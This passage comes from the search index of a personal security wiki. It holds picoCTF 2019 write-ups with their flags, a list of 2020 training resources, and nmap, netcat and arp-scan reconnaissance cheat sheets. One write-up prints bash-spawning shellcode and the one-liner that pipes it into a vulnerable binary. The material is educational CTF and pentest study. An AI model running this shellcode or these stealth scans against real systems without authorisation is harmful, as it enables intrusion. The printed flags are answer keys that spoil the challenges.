\"print('\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80')\" ; cat ) | ./vuln picoCTF{h4ndY_d4ndY_sh311c0d3_15d47ccd}","title":"handy-shellcode"},{"location":"Write-Ups/PicoCTF/2019/handy-shellcode/#handy-shellcode","text":"","title":"handy-shellcode"},{"location":"Write-Ups/PicoCTF/2019/handy-shellcode/#challenge","text":"This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb on the shell server. Source.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/handy-shellcode/#solution","text":"Looks like we need to just pipe in shellcode on the shell server, so I'm grabbing some shell code for just /bin/bash . I grabbed it from shell-storm . \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\" I used python to output the byte code and cat to keep my standard in, then piped it into vuln . ( python -c \"print('\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80')\" ; cat ) | ./vuln picoCTF{h4ndY_d4ndY_sh311c0d3_15d47ccd}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/like1000/","text":"like1000 Challenge This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c. Solution It looks like they're all .tar files, so I'm going to write a quick script to untar them. 1 2 3 4 5 6 7 8 9 10 #!/bin/bash i = 1000 while [ $i -ge 1 ] do tar xf $i .tar rm $i .tar (( i-- )) done picoCTF{l0t5_0f_TAR5}","title":"like1000"},{"location":"Write-Ups/PicoCTF/2019/like1000/#like1000","text":"","title":"like1000"},{"location":"Write-Ups/PicoCTF/2019/like1000/#challenge","text":"This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/like1000/#solution","text":"It looks like they're all .tar files, so I'm going to write a quick script to untar them. 1 2 3 4 5 6 7 8 9 10 #!/bin/bash i = 1000 while [ $i -ge 1 ] do tar xf $i .tar rm $i .tar (( i-- )) done picoCTF{l0t5_0f_TAR5}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/practice-run-1/","text":"practice-run-1 Challenge You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag. Solution chmod +x run_this ./run_this picoCTF{g3t_r3adY_2_r3v3r53}","title":"practice-run-1"},{"location":"Write-Ups/PicoCTF/2019/practice-run-1/#practice-run-1","text":"","title":"practice-run-1"},{"location":"Write-Ups/PicoCTF/2019/practice-run-1/#challenge","text":"You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/practice-run-1/#solution","text":"chmod +x run_this ./run_this picoCTF{g3t_r3adY_2_r3v3r53}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/shark%20on%20wire%201/","text":"shark on wire 1 Challenge We found this packet capture. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620. Solution Follow the streams. I started with TCP, then went to UDP. Found in a UDP stream. picoCTF{StaT31355_636f6e6e}","title":"shark on wire 1"},{"location":"Write-Ups/PicoCTF/2019/shark%20on%20wire%201/#shark-on-wire-1","text":"","title":"shark on wire 1"},{"location":"Write-Ups/PicoCTF/2019/shark%20on%20wire%201/#challenge","text":"We found this packet capture. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/shark%20on%20wire%201/#solution","text":"Follow the streams. I started with TCP, then went to UDP. Found in a UDP stream. picoCTF{StaT31355_636f6e6e}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/strings%20it/","text":"strings it Challenge Can you find the flag in file without running it? You can also find the file in /problems/strings-it_3_8386a6aa560aecfba03c0c6a550b5c51 on the shell server. Solution strings strings | grep picoCTF picoCTF{5tRIng5_1T_c7fff9e5}","title":"strings it"},{"location":"Write-Ups/PicoCTF/2019/strings%20it/#strings-it","text":"","title":"strings it"},{"location":"Write-Ups/PicoCTF/2019/strings%20it/#challenge","text":"Can you find the flag in file without running it? You can also find the file in /problems/strings-it_3_8386a6aa560aecfba03c0c6a550b5c51 on the shell server.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/strings%20it/#solution","text":"strings strings | grep picoCTF picoCTF{5tRIng5_1T_c7fff9e5}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/unzip/","text":"unzip Challenge Can you unzip this file and get the flag? Solution Just need to wget and unzip , then view the image. picoCTF{unz1pp1ng_1s_3a5y}","title":"unzip"},{"location":"Write-Ups/PicoCTF/2019/unzip/#unzip","text":"","title":"unzip"},{"location":"Write-Ups/PicoCTF/2019/unzip/#challenge","text":"Can you unzip this file and get the flag?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/unzip/#solution","text":"Just need to wget and unzip , then view the image. picoCTF{unz1pp1ng_1s_3a5y}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/vault-door-1/","text":"vault-door-1 Challenge This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java Solution In the file each character is by a number so the password can be put back into order. I just went through a bash one liner to get the correct output. grep password VaultDoor1.java | awk '{print $1 $3}' | grep charAt| cut -d '(' -f2 | sed 's/)/ /g' | sort -n | cut -d' ' -f2 | sed 's/;//g' | sed \"s/'//g\" | tr -d '\\n' picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_2487f0}","title":"vault-door-1"},{"location":"Write-Ups/PicoCTF/2019/vault-door-1/#vault-door-1","text":"","title":"vault-door-1"},{"location":"Write-Ups/PicoCTF/2019/vault-door-1/#challenge","text":"This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/vault-door-1/#solution","text":"In the file each character is by a number so the password can be put back into order. I just went through a bash one liner to get the correct output. grep password VaultDoor1.java | awk '{print $1 $3}' | grep charAt| cut -d '(' -f2 | sed 's/)/ /g' | sort -n | cut -d' ' -f2 | sed 's/;//g' | sed \"s/'//g\" | tr -d '\\n' picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_2487f0}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/vault-door-training/","text":"vault-door-training Challenge Your mission is to enter Dr. Evil's laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault's computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java Solution Read the source code, it's in there. picoCTF{w4rm1ng_Up_w1tH_jAv4_3b500738c12}","title":"vault-door-training"},{"location":"Write-Ups/PicoCTF/2019/vault-door-training/#vault-door-training","text":"","title":"vault-door-training"},{"location":"Write-Ups/PicoCTF/2019/vault-door-training/#challenge","text":"Your mission is to enter Dr. Evil's laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault's computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/vault-door-training/#solution","text":"Read the source code, it's in there. picoCTF{w4rm1ng_Up_w1tH_jAv4_3b500738c12}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/whats%20a%20net%20cat_/","text":"what's a net cat? Challenge Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 21865 to get the flag? Solution nc 2019shell1.picoctf.com 21865 picoCTF{nEtCat_Mast3ry_4fefb685}","title":"what's a net cat?"},{"location":"Write-Ups/PicoCTF/2019/whats%20a%20net%20cat_/#whats-a-net-cat","text":"","title":"what's a net cat?"},{"location":"Write-Ups/PicoCTF/2019/whats%20a%20net%20cat_/#challenge","text":"Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 21865 to get the flag?","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/whats%20a%20net%20cat_/#solution","text":"nc 2019shell1.picoctf.com 21865 picoCTF{nEtCat_Mast3ry_4fefb685}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/whats-the-difference/","text":"whats-the-difference Can't diff them so have to use something else. Can use cmp to compare bytes. 49734 231 160 49735 235 151 49736 230 143 49737 310 157 87663 12 103 162650 364 124 175231 153 106 175232 261 173 211986 230 164 211987 222 150 211988 15 63 211989 330 171 284427 122 162 292340 174 63 292341 371 137 331830 216 141 331831 365 65 426632 346 137 439903 360 144 515770 112 61 515771 252 146 583608 341 146 640996 310 63 688795 77 162 688796 107 63 702943 23 156 751424 243 164 754731 61 137 754732 113 64 754733 274 163 754734 304 137 796226 43 142 871159 256 165 871160 6 67 871161 316 67 871162 346 63 927506 347 162 927507 212 137 927508 122 64 994666 376 156 994667 43 144 994668 377 137 1068577 234 152 1068578 344 63 1068579 203 61 1068580 222 61 1068581 162 171 1101444 5 137 1101445 173 141 1101446 7 163 1101447 300 154 1171017 53 153 1171018 147 152 1171019 356 146 1241182 51 144 1241183 224 163 1241184 200 141 1241185 106 154 1272572 217 153 1272573 156 146 1337150 4 163 1410459 345 154 1410460 340 153 1460208 5 146 1510914 237 154 1567157 322 153 1567158 100 152 1567159 42 144 1567160 220 163 1567161 205 146 1581925 315 144 1581926 244 163 1581927 215 172 1581928 147 155 1581929 257 172 1677065 176 61 1677066 341 60 1764510 357 65 1764511 210 64 1764512 31 70 1766742 13 175 Column on the right looks like octal/ascii, so let me try using that. cmp -l kitters.jpg cattos.jpg | awk '{print $2}' I pasted those values into a file named array.txt . I needed to write a bash script to parse and convert that from octal into ascii. 1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do string += $( printf '%b' \"\\\\\" $i ) done echo $string bash solve.sh $(cat array.txt) picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}","title":"Whats the difference"},{"location":"Write-Ups/PicoCTF/2019/whats-the-difference/#whats-the-difference","text":"Can't diff them so have to use something else. Can use cmp to compare bytes. 49734 231 160 49735 235 151 49736 230 143 49737 310 157 87663 12 103 162650 364 124 175231 153 106 175232 261 173 211986 230 164 211987 222 150 211988 15 63 211989 330 171 284427 122 162 292340 174 63 292341 371 137 331830 216 141 331831 365 65 426632 346 137 439903 360 144 515770 112 61 515771 252 146 583608 341 146 640996 310 63 688795 77 162 688796 107 63 702943 23 156 751424 243 164 754731 61 137 754732 113 64 754733 274 163 754734 304 137 796226 43 142 871159 256 165 871160 6 67 871161 316 67 871162 346 63 927506 347 162 927507 212 137 927508 122 64 994666 376 156 994667 43 144 994668 377 137 1068577 234 152 1068578 344 63 1068579 203 61 1068580 222 61 1068581 162 171 1101444 5 137 1101445 173 141 1101446 7 163 1101447 300 154 1171017 53 153 1171018 147 152 1171019 356 146 1241182 51 144 1241183 224 163 1241184 200 141 1241185 106 154 1272572 217 153 1272573 156 146 1337150 4 163 1410459 345 154 1410460 340 153 1460208 5 146 1510914 237 154 1567157 322 153 1567158 100 152 1567159 42 144 1567160 220 163 1567161 205 146 1581925 315 144 1581926 244 163 1581927 215 172 1581928 147 155 1581929 257 172 1677065 176 61 1677066 341 60 1764510 357 65 1764511 210 64 1764512 31 70 1766742 13 175 Column on the right looks like octal/ascii, so let me try using that. cmp -l kitters.jpg cattos.jpg | awk '{print $2}' I pasted those values into a file named array.txt . I needed to write a bash script to parse and convert that from octal into ascii. 1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash array =( \" $@ \" ) string = '' for i in \" ${ array [@] } \" do string += $( printf '%b' \"\\\\\" $i ) done echo $string bash solve.sh $(cat array.txt) picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}","title":"whats-the-difference"},{"location":"Write-Ups/PicoCTF/2019/where%20are%20the%20robots/","text":"where are the robots Challenge Can you find the robots? https://2019shell1.picoctf.com/problem/21868/ (link) or http://2019shell1.picoctf.com:21868 Solution wget https://2019shell1.picoctf.com/problem/21868/robots.txt cat robots.txt wget https://2019shell1.picoctf.com/problem/21868/e0779.html cat e0779.html picoCTF{ca1cu1at1ng_Mach1n3s_e0779}","title":"where are the robots"},{"location":"Write-Ups/PicoCTF/2019/where%20are%20the%20robots/#where-are-the-robots","text":"","title":"where are the robots"},{"location":"Write-Ups/PicoCTF/2019/where%20are%20the%20robots/#challenge","text":"Can you find the robots? https://2019shell1.picoctf.com/problem/21868/ (link) or http://2019shell1.picoctf.com:21868","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/where%20are%20the%20robots/#solution","text":"wget https://2019shell1.picoctf.com/problem/21868/robots.txt cat robots.txt wget https://2019shell1.picoctf.com/problem/21868/e0779.html cat e0779.html picoCTF{ca1cu1at1ng_Mach1n3s_e0779}","title":"Solution"},{"location":"Write-Ups/PicoCTF/2019/where-is-the-file/","text":"where-is-the-file Challenge I've used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_0_cc140a3ba634658b98122a1954c1316a. Solution It's just a hidden file in the directory they give you. picoCTF{w3ll_that_d1dnt_w0RK_b2dab472}","title":"where-is-the-file"},{"location":"Write-Ups/PicoCTF/2019/where-is-the-file/#where-is-the-file","text":"","title":"where-is-the-file"},{"location":"Write-Ups/PicoCTF/2019/where-is-the-file/#challenge","text":"I've used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_0_cc140a3ba634658b98122a1954c1316a.","title":"Challenge"},{"location":"Write-Ups/PicoCTF/2019/where-is-the-file/#solution","text":"It's just a hidden file in the directory they give you. picoCTF{w3ll_that_d1dnt_w0RK_b2dab472}","title":"Solution"},{"location":"wiki/","text":"Home In an effort to make maintain my documentation and make it accessible, I've generated this Wiki. This wiki consists tidbits of: Penetration Testing and Offensive Security Defensive Security (hopefully soon) Systems Administration Organizational structure and resources are likely to change, as I continue to organize and evaluate how I want information presented. Enjoy!","title":"Home"},{"location":"wiki/#home","text":"In an effort to make maintain my documentation and make it accessible, I've generated this Wiki. This wiki consists tidbits of: Penetration Testing and Offensive Security Defensive Security (hopefully soon) Systems Administration Organizational structure and resources are likely to change, as I continue to organize and evaluate how I want information presented. Enjoy!","title":"Home"},{"location":"wiki/Virtual%20Resources%202020/","text":"Virtual Resources of 2020 Conferences https://docs.google.com/spreadsheets/d/1tpAaQIvinXFzW2dpJMe6am3FVFEMsQYMRj5ZaLnUt-U/edit#gid=0 https://airtable.com/shrJRUGOvAoX9VRiz/tblB91yMDCzGLwWk0?blocks=hide https://medium.com/@bryantjiminson/conferences-that-got-cancelled-due-to-coronavirus-b8ca1c295687 https://docs.google.com/spreadsheets/d/1IKXAcDoYnWNpuFaDYkn_aplDZ5fRI0bJNWah0rGFO5E/edit#gid=0 Trainings Comptia ITF+ https://certs.comptia.org/means_more/?fbclid=IwAR0pL70SmwP1x0a9fhgwvXh7yg5BrZFzJ1P4sRKW3Uq-8r_-H6E3jlKdjP0#lp-pom-form-19 PluralSight free for month of April https://www.pluralsight.com/ Free Azure Class https://www.pluralsight.com/partners/microsoft/azure Free Redhat Classes Red Hat Enterprise Linux Technical Overview (RH024) - https://www.redhat.com/en/services/training/rh024-red-hat-linux-technical-overview Red Hat Agile Integration Technical Overview (DO040) - https://www.redhat.com/en/services/training/do040-red-hat-agile-integration-technical-overview Ansible Essentials: Simplicity in Automation Technical Overview (DO007) - https://www.redhat.com/en/services/training/do007-ansible-essentials-simplicity-automation-technical-overview Deploying Containerized Applications Tech Overview (DO080) - https://www.redhat.com/en/services/training/do080-deploying-containerized-applications-technical-overview Red Hat Satellite Technical Overview (RH053) - https://www.redhat.com/en/services/training/rh053-red-hat-satellite-technical-overview Red Hat OpenStack Technical Overview (CL010) - https://www.redhat.com/en/services/training/cl010-red-hat-openstack-technical-overview Virtualization and Infrastructure Migration Technical Overview (RH018) - https://www.redhat.com/en/services/training/rh018-virtualization-and-infrastructure-migration-technical-overview Talks Cybersecurity as Realpolitik by Dan Geer presented at Black Hat USA 2014 https://www.youtube.com/watch?v=nT-TGvYOBpI&feature=youtu.be USENIX Enigma 2016 - NSA TAO Chief on Disrupting Nation State Hackers https://www.youtube.com/watch?v=bDJb8WOJYdA&feature=youtu.be Renowned Author Cyber Pioneer Cliff Stoll Mesmerizes at CrowdStrike Conference https://www.youtube.com/watch?v=ddAtMMDeeq8&feature=youtu.be TR17 - Surprise Bitches! - The Grugq https://www.youtube.com/watch?v=wP2J9aYM6Oo&feature=youtu.be Hunting: From Fudd to Terminator - SANS Threat Hunting Summit 2017 https://www.youtube.com/watch?v=ByiSFI9D1As&feature=youtu.be MITRE ATT&CKcon 2018: Helping Your Non-Security Executives Understand ATT&CK in 10 Minutes or Less https://www.youtube.com/watch?v=eZsMHSE2PDc&feature=emb_logo Keynote by Mr. Thomas Dullien - CyCon 2018 https://www.youtube.com/watch?v=q98foLaAfX8&feature=emb_logo Friday Keynote: Mara Tam - Magical thinking \u2026 and how to thwart it https://www.youtube.com/watch?v=-pqsL-XsP2Q&feature=emb_logo Dispelling the Top 10 Myths in Cybersecurity https://www.youtube.com/watch?time_continue=49&v=qpxM0uM20uU&feature=emb_logo BlueHat Seattle 2019 || Keynote, Alex Stamos https://www.youtube.com/watch?v=uohyx7OIugY&feature=emb_logo What You Need To Know About Stalkerware - Eva Galperin https://www.ted.com/talks/eva_galperin_what_you_need_to_know_about_stalkerware CTFs https://ctftime.org/event/list/upcoming https://www.sans.org/netwars https://store.steampowered.com/app/994670/ThreatGEN_Red_vs_Blue/ https://github.com/mitre/caldera Youtube LiveOverflow Cybering Computerphile Hackersploit Hak5 Nullbyte GynvaelEN The Cyber Mentor IppSec JohnHammond Culmination List USA based Information Security & I.T. Conferences News (lots of ways to get it) Twitter Reddit Arstechnica The Register Motherboard USCERT Krebs on Security TheHackerNews BleedingComputer ZDNet DarkReading Malwarebytes Labs Threatpost SecurityBoulevard SecurityWeekly Social Media (not vetted) https://join.slack.com/t/gcdevelopers/shared_invite/enQtNzc1NjYyOTA1ODkzLTc5NThmZTExMjllNWFmYzUwYjk0MjJmNjczODA4N2JjMDE5YWIxYWFmMzVjMWUxZGVmY2IwZWVlOTJhMWUyZmI https://discordapp.com/invite/aJwTAgS https://discord.gg/Z9dpTFg","title":"Virtual Resources of 2020"},{"location":"wiki/Virtual%20Resources%202020/#virtual-resources-of-2020","text":"","title":"Virtual Resources of 2020"},{"location":"wiki/Virtual%20Resources%202020/#conferences","text":"https://docs.google.com/spreadsheets/d/1tpAaQIvinXFzW2dpJMe6am3FVFEMsQYMRj5ZaLnUt-U/edit#gid=0 https://airtable.com/shrJRUGOvAoX9VRiz/tblB91yMDCzGLwWk0?blocks=hide https://medium.com/@bryantjiminson/conferences-that-got-cancelled-due-to-coronavirus-b8ca1c295687 https://docs.google.com/spreadsheets/d/1IKXAcDoYnWNpuFaDYkn_aplDZ5fRI0bJNWah0rGFO5E/edit#gid=0","title":"Conferences"},{"location":"wiki/Virtual%20Resources%202020/#trainings","text":"Comptia ITF+ https://certs.comptia.org/means_more/?fbclid=IwAR0pL70SmwP1x0a9fhgwvXh7yg5BrZFzJ1P4sRKW3Uq-8r_-H6E3jlKdjP0#lp-pom-form-19 PluralSight free for month of April https://www.pluralsight.com/ Free Azure Class https://www.pluralsight.com/partners/microsoft/azure Free Redhat Classes Red Hat Enterprise Linux Technical Overview (RH024) - https://www.redhat.com/en/services/training/rh024-red-hat-linux-technical-overview Red Hat Agile Integration Technical Overview (DO040) - https://www.redhat.com/en/services/training/do040-red-hat-agile-integration-technical-overview Ansible Essentials: Simplicity in Automation Technical Overview (DO007) - https://www.redhat.com/en/services/training/do007-ansible-essentials-simplicity-automation-technical-overview Deploying Containerized Applications Tech Overview (DO080) - https://www.redhat.com/en/services/training/do080-deploying-containerized-applications-technical-overview Red Hat Satellite Technical Overview (RH053) - https://www.redhat.com/en/services/training/rh053-red-hat-satellite-technical-overview Red Hat OpenStack Technical Overview (CL010) - https://www.redhat.com/en/services/training/cl010-red-hat-openstack-technical-overview Virtualization and Infrastructure Migration Technical Overview (RH018) - https://www.redhat.com/en/services/training/rh018-virtualization-and-infrastructure-migration-technical-overview","title":"Trainings"},{"location":"wiki/Virtual%20Resources%202020/#talks","text":"Cybersecurity as Realpolitik by Dan Geer presented at Black Hat USA 2014 https://www.youtube.com/watch?v=nT-TGvYOBpI&feature=youtu.be USENIX Enigma 2016 - NSA TAO Chief on Disrupting Nation State Hackers https://www.youtube.com/watch?v=bDJb8WOJYdA&feature=youtu.be Renowned Author Cyber Pioneer Cliff Stoll Mesmerizes at CrowdStrike Conference https://www.youtube.com/watch?v=ddAtMMDeeq8&feature=youtu.be TR17 - Surprise Bitches! - The Grugq https://www.youtube.com/watch?v=wP2J9aYM6Oo&feature=youtu.be Hunting: From Fudd to Terminator - SANS Threat Hunting Summit 2017 https://www.youtube.com/watch?v=ByiSFI9D1As&feature=youtu.be MITRE ATT&CKcon 2018: Helping Your Non-Security Executives Understand ATT&CK in 10 Minutes or Less https://www.youtube.com/watch?v=eZsMHSE2PDc&feature=emb_logo Keynote by Mr. Thomas Dullien - CyCon 2018 https://www.youtube.com/watch?v=q98foLaAfX8&feature=emb_logo Friday Keynote: Mara Tam - Magical thinking \u2026 and how to thwart it https://www.youtube.com/watch?v=-pqsL-XsP2Q&feature=emb_logo Dispelling the Top 10 Myths in Cybersecurity https://www.youtube.com/watch?time_continue=49&v=qpxM0uM20uU&feature=emb_logo BlueHat Seattle 2019 || Keynote, Alex Stamos https://www.youtube.com/watch?v=uohyx7OIugY&feature=emb_logo What You Need To Know About Stalkerware - Eva Galperin https://www.ted.com/talks/eva_galperin_what_you_need_to_know_about_stalkerware","title":"Talks"},{"location":"wiki/Virtual%20Resources%202020/#ctfs","text":"https://ctftime.org/event/list/upcoming https://www.sans.org/netwars https://store.steampowered.com/app/994670/ThreatGEN_Red_vs_Blue/ https://github.com/mitre/caldera","title":"CTFs"},{"location":"wiki/Virtual%20Resources%202020/#youtube","text":"LiveOverflow Cybering Computerphile Hackersploit Hak5 Nullbyte GynvaelEN The Cyber Mentor IppSec JohnHammond","title":"Youtube"},{"location":"wiki/Virtual%20Resources%202020/#culmination-list","text":"USA based Information Security & I.T. Conferences","title":"Culmination List"},{"location":"wiki/Virtual%20Resources%202020/#news-lots-of-ways-to-get-it","text":"Twitter Reddit Arstechnica The Register Motherboard USCERT Krebs on Security TheHackerNews BleedingComputer ZDNet DarkReading Malwarebytes Labs Threatpost SecurityBoulevard SecurityWeekly","title":"News (lots of ways to get it)"},{"location":"wiki/Virtual%20Resources%202020/#social-media-not-vetted","text":"https://join.slack.com/t/gcdevelopers/shared_invite/enQtNzc1NjYyOTA1ODkzLTc5NThmZTExMjllNWFmYzUwYjk0MjJmNjczODA4N2JjMDE5YWIxYWFmMzVjMWUxZGVmY2IwZWVlOTJhMWUyZmI https://discordapp.com/invite/aJwTAgS https://discord.gg/Z9dpTFg","title":"Social Media (not vetted)"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Arp-scan/","text":"Establish the variable export ip = 192 .168.1.100 Discover active IPs usign ARP on the network arp-scan $ip /24","title":"Arp scan"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Arp-scan/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Arp-scan/#discover-active-ips-usign-arp-on-the-network","text":"arp-scan $ip /24","title":"Discover active IPs usign ARP on the network"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netcat/","text":"Establish the variable export ip = 192 .168.1.100 Netcat port Scanning nc -nvv -w 1 -z $ip 3388 -3390","title":"Netcat"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netcat/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netcat/#netcat-port-scanning","text":"nc -nvv -w 1 -z $ip 3388 -3390","title":"Netcat port Scanning"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netdiscover/","text":"Establish the variable export ip = 192 .168.1.100 Discover who else is on the network netdiscover Discover IP Mac and Mac vendors from ARP netdiscover -r $ip /24","title":"Netdiscover"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netdiscover/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netdiscover/#discover-who-else-is-on-the-network","text":"netdiscover","title":"Discover who else is on the network"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Netdiscover/#discover-ip-mac-and-mac-vendors-from-arp","text":"netdiscover -r $ip /24","title":"Discover IP Mac and Mac vendors from ARP"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/","text":"Establish the variable export ip = 192 .168.1.100 Typical Nmap scan nmap -sV -sC -O -oA scan $ip Nmap stealth scan using SYN nmap -sS $ip Nmap stealth scan using FIN nmap -sF $ip Nmap Banner Grabbing nmap -sV -sT $ip Nmap OS Fingerprinting nmap -O $ip Nmap Regular Scan: nmap $ip /24 Enumeration Scan All Ports TCP / UDP and output to a txt file nmap -oN scan.txt -v -sU -sS -p- -A -T4 $ip Nmap output to a file: nmap -oN scan.txt -p 1 -65535 -sV -sS -A -T4 $ip /24 Quick Scan: nmap -T4 -F $ip /24 Quick Scan Plus: nmap -sV -T4 -O -F --version-light $ip /24 Quick traceroute nmap -sn --traceroute $ip All TCP and UDP Ports nmap -v -sU -sS -p- -A -T4 $ip Intense Scan: nmap -T4 -A -v $ip Intense Scan Plus UDP nmap -sS -sU -T4 -A -v $ip /24 Intense Scan ALL TCP Ports nmap -p 1 -65535 -T4 -A -v $ip /24 Intense Scan - No Ping nmap -T4 -A -v -Pn $ip /24 Ping scan nmap -sn $ip /24 Slow Comprehensive Scan nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script \"default or (discovery and safe)\" $ip /24 Scan with Active connect in order to weed out any spoofed ports designed to troll you nmap -p1-65535 -A -T5 -sT $ip","title":"Nmap"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#establish-the-variable","text":"export ip = 192 .168.1.100","title":"Establish the variable"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#typical-nmap-scan","text":"nmap -sV -sC -O -oA scan $ip","title":"Typical Nmap scan"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#nmap-stealth-scan-using-syn","text":"nmap -sS $ip","title":"Nmap stealth scan using SYN"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#nmap-stealth-scan-using-fin","text":"nmap -sF $ip","title":"Nmap stealth scan using FIN"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#nmap-banner-grabbing","text":"nmap -sV -sT $ip","title":"Nmap Banner Grabbing"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#nmap-os-fingerprinting","text":"nmap -O $ip","title":"Nmap OS Fingerprinting"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#nmap-regular-scan","text":"nmap $ip /24","title":"Nmap Regular Scan:"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#enumeration-scan-all-ports-tcp-udp-and-output-to-a-txt-file","text":"nmap -oN scan.txt -v -sU -sS -p- -A -T4 $ip","title":"Enumeration Scan All Ports TCP / UDP and output to a txt file"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#nmap-output-to-a-file","text":"nmap -oN scan.txt -p 1 -65535 -sV -sS -A -T4 $ip /24","title":"Nmap output to a file:"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#quick-scan","text":"nmap -T4 -F $ip /24","title":"Quick Scan:"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#quick-scan-plus","text":"nmap -sV -T4 -O -F --version-light $ip /24","title":"Quick Scan Plus:"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#quick-traceroute","text":"nmap -sn --traceroute $ip","title":"Quick traceroute"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#all-tcp-and-udp-ports","text":"nmap -v -sU -sS -p- -A -T4 $ip","title":"All TCP and UDP Ports"},{"location":"wiki/Penetration%20Testing/Active%20Enumeration/Nmap/#intense-scan","text":"nmap -T4 -A -v $ip","title":"Intense 